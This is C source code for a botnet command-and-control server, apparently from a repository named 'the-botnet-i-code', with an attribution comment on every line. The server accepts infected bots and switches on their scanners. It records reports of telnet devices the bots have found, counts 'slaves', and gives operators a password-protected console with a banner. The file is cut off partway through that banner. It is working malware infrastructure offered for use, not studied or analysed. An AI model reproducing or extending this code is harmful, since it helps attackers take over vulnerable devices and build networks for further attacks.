#include <stdio.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <stdlib.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <stdint.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <inttypes.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <string.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <sys/types.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <sys/socket.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <netdb.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <unistd.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <time.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <fcntl.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <sys/epoll.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <errno.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <pthread.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <signal.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#include <arpa/inet.h> // written by https://github.com/riu-developer-owo/the-botnet-i-code
#define MAXFDS 1000000 // written by https://github.com/riu-developer-owo/the-botnet-i-code
////////////////////////////////// // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct login_info { // written by https://github.com/riu-developer-owo/the-botnet-i-code
char username[20]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char password[20]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
}; // written by https://github.com/riu-developer-owo/the-botnet-i-code
static struct login_info accounts[22]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct clientdata_t { // written by https://github.com/riu-developer-owo/the-botnet-i-code
uint32_t ip; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char connected; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} clients[MAXFDS]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct telnetdata_t { // written by https://github.com/riu-developer-owo/the-botnet-i-code
int connected; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} managements[MAXFDS]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct args { // written by https://github.com/riu-developer-owo/the-botnet-i-code
int sock; // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct sockaddr_in cli_addr; // written by https://github.com/riu-developer-owo/the-botnet-i-code
}; // written by https://github.com/riu-developer-owo/the-botnet-i-code
static volatile FILE *telFD; // written by https://github.com/riu-developer-owo/the-botnet-i-code
static volatile FILE *fileFD; // written by https://github.com/riu-developer-owo/the-botnet-i-code
static volatile int epollFD = 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
static volatile int listenFD = 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
static volatile int OperatorsConnected = 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
static volatile int TELFound = 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
static volatile int scannerreport; // written by https://github.com/riu-developer-owo/the-botnet-i-code
////////////////////////////////// // written by https://github.com/riu-developer-owo/the-botnet-i-code
int fdgets(unsigned char *buffer, int bufferSize, int fd) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
int total = 0, got = 1; // written by https://github.com/riu-developer-owo/the-botnet-i-code
while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; } // written by https://github.com/riu-developer-owo/the-botnet-i-code
return got; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
void trim(char *str) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
int i; // written by https://github.com/riu-developer-owo/the-botnet-i-code
int begin = 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
int end = strlen(str) - 1; // written by https://github.com/riu-developer-owo/the-botnet-i-code
while (isspace(str[begin])) begin++; // written by https://github.com/riu-developer-owo/the-botnet-i-code
while ((end >= begin) && isspace(str[end])) end--; // written by https://github.com/riu-developer-owo/the-botnet-i-code
for (i = begin; i <= end; i++) str[i - begin] = str[i]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
str[i - begin] = '\0'; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
static int make_socket_non_blocking (int sfd) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
int flags, s; // written by https://github.com/riu-developer-owo/the-botnet-i-code
flags = fcntl (sfd, F_GETFL, 0); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (flags == -1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
perror ("fcntl"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
return -1; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
flags |= O_NONBLOCK; // written by https://github.com/riu-developer-owo/the-botnet-i-code
s = fcntl (sfd, F_SETFL, flags); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (s == -1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
perror ("fcntl"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
return -1; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
return 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
static int create_and_bind (char *port) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct addrinfo hints; // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct addrinfo *result, *rp; // written by https://github.com/riu-developer-owo/the-botnet-i-code
int s, sfd; // written by https://github.com/riu-developer-owo/the-botnet-i-code
memset (&hints, 0, sizeof (struct addrinfo)); // written by https://github.com/riu-developer-owo/the-botnet-i-code
hints.ai_family = AF_UNSPEC;     /* Return IPv4 and IPv6 choices */ // written by https://github.com/riu-developer-owo/the-botnet-i-code
hints.ai_socktype = SOCK_STREAM; /* We want a TCP socket */ // written by https://github.com/riu-developer-owo/the-botnet-i-code
hints.ai_flags = AI_PASSIVE;     /* All interfaces */ // written by https://github.com/riu-developer-owo/the-botnet-i-code
s = getaddrinfo (NULL, port, &hints, &result); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (s != 0) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s)); // written by https://github.com/riu-developer-owo/the-botnet-i-code
return -1; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
for (rp = result; rp != NULL; rp = rp->ai_next) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (sfd == -1) continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
int yes = 1; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
s = bind (sfd, rp->ai_addr, rp->ai_addrlen); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (s == 0) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
break; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
close (sfd); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (rp == NULL) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
fprintf (stderr, "Could not bind\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
return -1; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
freeaddrinfo (result); // written by https://github.com/riu-developer-owo/the-botnet-i-code
return sfd; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
void broadcast(char *msg, int us, char *sender) // written by https://github.com/riu-developer-owo/the-botnet-i-code
{ // written by https://github.com/riu-developer-owo/the-botnet-i-code
int sendMGM = 1; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strcmp(msg, "PING") == 0) sendMGM = 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char *wot = malloc(strlen(msg) + 10); // written by https://github.com/riu-developer-owo/the-botnet-i-code
memset(wot, 0, strlen(msg) + 10); // written by https://github.com/riu-developer-owo/the-botnet-i-code
strcpy(wot, msg); // written by https://github.com/riu-developer-owo/the-botnet-i-code
trim(wot); // written by https://github.com/riu-developer-owo/the-botnet-i-code
time_t rawtime; // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct tm * timeinfo; // written by https://github.com/riu-developer-owo/the-botnet-i-code
time(&rawtime); // written by https://github.com/riu-developer-owo/the-botnet-i-code
timeinfo = localtime(&rawtime); // written by https://github.com/riu-developer-owo/the-botnet-i-code
char *timestamp = asctime(timeinfo); // written by https://github.com/riu-developer-owo/the-botnet-i-code
trim(timestamp); // written by https://github.com/riu-developer-owo/the-botnet-i-code
int i; // written by https://github.com/riu-developer-owo/the-botnet-i-code
for(i = 0; i < MAXFDS; i++) // written by https://github.com/riu-developer-owo/the-botnet-i-code
{ // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(sendMGM && managements[i].connected) // written by https://github.com/riu-developer-owo/the-botnet-i-code
{ // written by https://github.com/riu-developer-owo/the-botnet-i-code
send(i, "\x1b[33m", 5, MSG_NOSIGNAL); // written by https://github.com/riu-developer-owo/the-botnet-i-code
send(i, sender, strlen(sender), MSG_NOSIGNAL); // Para: SS // written by https://github.com/riu-developer-owo/the-botnet-i-code
send(i, ": ", 2, MSG_NOSIGNAL); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
printf("sent to fd: %d\n", i); // written by https://github.com/riu-developer-owo/the-botnet-i-code
send(i, msg, strlen(msg), MSG_NOSIGNAL); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[37mType: ", 13, MSG_NOSIGNAL); // written by https://github.com/riu-developer-owo/the-botnet-i-code
else send(i, "\n", 1, MSG_NOSIGNAL); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
free(wot); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
void *BotEventLoop(void *useless) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct epoll_event event; // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct epoll_event *events; // written by https://github.com/riu-developer-owo/the-botnet-i-code
int s; // written by https://github.com/riu-developer-owo/the-botnet-i-code
events = calloc (MAXFDS, sizeof event); // written by https://github.com/riu-developer-owo/the-botnet-i-code
while (1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
int n, i; // written by https://github.com/riu-developer-owo/the-botnet-i-code
n = epoll_wait (epollFD, events, MAXFDS, -1); // written by https://github.com/riu-developer-owo/the-botnet-i-code
for (i = 0; i < n; i++) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
clients[events[i].data.fd].connected = 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
close(events[i].data.fd); // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
else if (listenFD == events[i].data.fd) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
while (1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct sockaddr in_addr; // written by https://github.com/riu-developer-owo/the-botnet-i-code
socklen_t in_len; // written by https://github.com/riu-developer-owo/the-botnet-i-code
int infd, ipIndex; // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codein_len = sizeof in_addr; // written by https://github.com/riu-developer-owo/the-botnet-i-code
infd = accept (listenFD, &in_addr, &in_len); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (infd == -1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break; // written by https://github.com/riu-developer-owo/the-botnet-i-code
else { // written by https://github.com/riu-developer-owo/the-botnet-i-code
perror ("accept"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
break; // written by https://github.com/riu-developer-owo/the-botnet-i-code
 } // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codeclients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr; // written by https://github.com/riu-developer-owo/the-botnet-i-code
int dup = 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(!clients[ipIndex].connected || ipIndex == infd) continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(clients[ipIndex].ip == clients[infd].ip) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
dup = 1; // written by https://github.com/riu-developer-owo/the-botnet-i-code
break; // written by https://github.com/riu-developer-owo/the-botnet-i-code
}} // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(dup) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(infd, "!* LOLNOGTFO\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; } // written by https://github.com/riu-developer-owo/the-botnet-i-code
close(infd); // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
s = make_socket_non_blocking (infd); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (s == -1) { close(infd); break; } // written by https://github.com/riu-developer-owo/the-botnet-i-code
event.data.fd = infd; // written by https://github.com/riu-developer-owo/the-botnet-i-code
event.events = EPOLLIN | EPOLLET; // written by https://github.com/riu-developer-owo/the-botnet-i-code
s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (s == -1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
perror ("epoll_ctl"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
close(infd); // written by https://github.com/riu-developer-owo/the-botnet-i-code
break; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
clients[infd].connected = 1; // written by https://github.com/riu-developer-owo/the-botnet-i-code
send(infd, "!* SCANNER ON\n", 14, MSG_NOSIGNAL); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
else { // written by https://github.com/riu-developer-owo/the-botnet-i-code
int datafd = events[i].data.fd; // written by https://github.com/riu-developer-owo/the-botnet-i-code
struct clientdata_t *client = &(clients[datafd]); // written by https://github.com/riu-developer-owo/the-botnet-i-code
int done = 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
client->connected = 1; // written by https://github.com/riu-developer-owo/the-botnet-i-code
while (1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
ssize_t count; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char buf[2048]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
memset(buf, 0, sizeof buf); // written by https://github.com/riu-developer-owo/the-botnet-i-code
while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strstr(buf, "\n") == NULL) { done = 1; break; } // written by https://github.com/riu-developer-owo/the-botnet-i-code
trim(buf); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strcmp(buf, "PING") == 0) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strstr(buf, "REPORT ") == buf) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
char *line = strstr(buf, "REPORT ") + 7; // written by https://github.com/riu-developer-owo/the-botnet-i-code
fprintf(telFD, "%s\n", line); // written by https://github.com/riu-developer-owo/the-botnet-i-code
fflush(telFD); // written by https://github.com/riu-developer-owo/the-botnet-i-code
TELFound++; // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strstr(buf, "PROBING") == buf) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
char *line = strstr(buf, "PROBING"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
scannerreport = 1; // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strstr(buf, "REMOVING PROBE") == buf) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
char *line = strstr(buf, "REMOVING PROBE"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
scannerreport = 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strcmp(buf, "PONG") == 0) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
printf("buf: \"%s\"\n", buf); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (count == -1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (errno != EAGAIN) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
done = 1; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
break; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
else if (count == 0) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
done = 1; // written by https://github.com/riu-developer-owo/the-botnet-i-code
break; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
if (done) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
client->connected = 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
close(datafd); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
unsigned int BotsConnected() { // written by https://github.com/riu-developer-owo/the-botnet-i-code
int i = 0, total = 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
for(i = 0; i < MAXFDS; i++) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(!clients[i].connected) continue; // written by https://github.com/riu-developer-owo/the-botnet-i-code
total++; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
return total; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
void *TitleWriter(void *sock) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
int datafd = (int)sock; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char string[2048]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
while(1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
memset(string, 0, 2048); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(string, "%c]0;Slaves Connected: %d | Masters Connected: %d%c", '\033', BotsConnected(), OperatorsConnected, '\007'); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return; // written by https://github.com/riu-developer-owo/the-botnet-i-code
sleep(2); // written by https://github.com/riu-developer-owo/the-botnet-i-code
}} // written by https://github.com/riu-developer-owo/the-botnet-i-code
int Find_Login(char *str) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
FILE *fp; // written by https://github.com/riu-developer-owo/the-botnet-i-code
int line_num = 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
int find_result = 0, find_line=0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char temp[512]; // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codeif((fp = fopen("login.txt", "r")) == NULL){ // written by https://github.com/riu-developer-owo/the-botnet-i-code
return(-1); // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
while(fgets(temp, 512, fp) != NULL){ // written by https://github.com/riu-developer-owo/the-botnet-i-code
if((strstr(temp, str)) != NULL){ // written by https://github.com/riu-developer-owo/the-botnet-i-code
find_result++; // written by https://github.com/riu-developer-owo/the-botnet-i-code
find_line = line_num; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
line_num++; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(fp) // written by https://github.com/riu-developer-owo/the-botnet-i-code
fclose(fp); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(find_result == 0)return 0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
return find_line; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
void *BotWorker(void *sock) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
int datafd = (int)sock; // written by https://github.com/riu-developer-owo/the-botnet-i-code
int find_line; // written by https://github.com/riu-developer-owo/the-botnet-i-code
OperatorsConnected++; // written by https://github.com/riu-developer-owo/the-botnet-i-code
pthread_t title; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char buf[2048]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char* username; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char* password; // written by https://github.com/riu-developer-owo/the-botnet-i-code
memset(buf, 0, sizeof buf); // written by https://github.com/riu-developer-owo/the-botnet-i-code
char botnet[2048]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
memset(botnet, 0, 2048); // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codeFILE *fp; // written by https://github.com/riu-developer-owo/the-botnet-i-code
int i=0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
int c; // written by https://github.com/riu-developer-owo/the-botnet-i-code
fp=fopen("login.txt", "r"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
while(!feof(fp)) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
c=fgetc(fp); // written by https://github.com/riu-developer-owo/the-botnet-i-code
++i; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
int j=0; // written by https://github.com/riu-developer-owo/the-botnet-i-code
rewind(fp); // written by https://github.com/riu-developer-owo/the-botnet-i-code
while(j!=i-1) { // written by https://github.com/riu-developer-owo/the-botnet-i-code
fscanf(fp, "%s %s", accounts[j].username, accounts[j].password); // written by https://github.com/riu-developer-owo/the-botnet-i-code
++j; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codeif(send(datafd, "\x1b[37mUsername: \x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(fdgets(buf, sizeof buf, datafd) < 1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
trim(buf); // written by https://github.com/riu-developer-owo/the-botnet-i-code
char* nickstring; // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(accounts[find_line].username, buf); // written by https://github.com/riu-developer-owo/the-botnet-i-code
nickstring = ("%s", buf); // written by https://github.com/riu-developer-owo/the-botnet-i-code
find_line = Find_Login(nickstring); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strcmp(nickstring, accounts[find_line].username) == 0){ // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, "\x1b[37mPassword: \x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(fdgets(buf, sizeof buf, datafd) < 1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
trim(buf); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(strcmp(buf, accounts[find_line].password) != 0) goto failed; // written by https://github.com/riu-developer-owo/the-botnet-i-code
memset(buf, 0, 2048); // written by https://github.com/riu-developer-owo/the-botnet-i-code
goto Banner; // written by https://github.com/riu-developer-owo/the-botnet-i-code
} // written by https://github.com/riu-developer-owo/the-botnet-i-code
failed: // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char failed_line1[80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codesprintf(failed_line1, "\x1b[36mWRONG ANSWER BITCH!!\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
if(send(datafd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code
sleep(5); // written by https://github.com/riu-developer-owo/the-botnet-i-code
goto end; // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codeBanner: // written by https://github.com/riu-developer-owo/the-botnet-i-code
pthread_create(&title, NULL, &TitleWriter, sock); // written by https://github.com/riu-developer-owo/the-botnet-i-code
char ascii_banner_line1 [5000]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char ascii_banner_line2 [5000]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char ascii_banner_line3 [5000]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char ascii_banner_line4 [5000]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char ascii_banner_line5 [5000]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char ascii_banner_line6 [5000]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char ascii_banner_line7 [5000]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char ascii_banner_line8 [5000]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char ascii_banner_line9 [5000]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char welcome_line [80]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
char banner_bot_count [2048]; // written by https://github.com/riu-developer-owo/the-botnet-i-code
memset(banner_bot_count, 0, 2048); // written by https://github.com/riu-developer-owo/the-botnet-i-code

 // written by https://github.com/riu-developer-owo/the-botnet-i-codesprintf(ascii_banner_line1, "\x1b[36m   **     **              **          \r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(ascii_banner_line2, "\x1b[36m  /**    /**             //           \r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(ascii_banner_line3, "\x1b[36m  /**    /**   *******    **   **   **\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(ascii_banner_line4, "\x1b[36m  /**    /*   //**///**  /**  //** ** \r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(ascii_banner_line5, "\x1b[36m  /**    /**   /**  /**  /**   //***  \r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(ascii_banner_line6, "\x1b[36m  /**    /**   /**  /**  /**    **/** \r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(ascii_banner_line7, "\x1b[36m  //*******    ***  /**  /**   ** //**\r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(ascii_banner_line8, "\x1b[36m   ///////    ///   //   //   //   // \r\n"); // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(ascii_banner_line9, "\r\n");	 // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(welcome_line,       "\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n", BotsConnected(), OperatorsConnected);  // written by https://github.com/riu-developer-owo/the-botnet-i-code
sprintf(banner_bot_count, 	"\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome, %s\x1b[36m --------\x1b[37m#\r\n", accounts[find_line].username); // written by https://github.com/riu-developer-owo/the-botnet-i-code

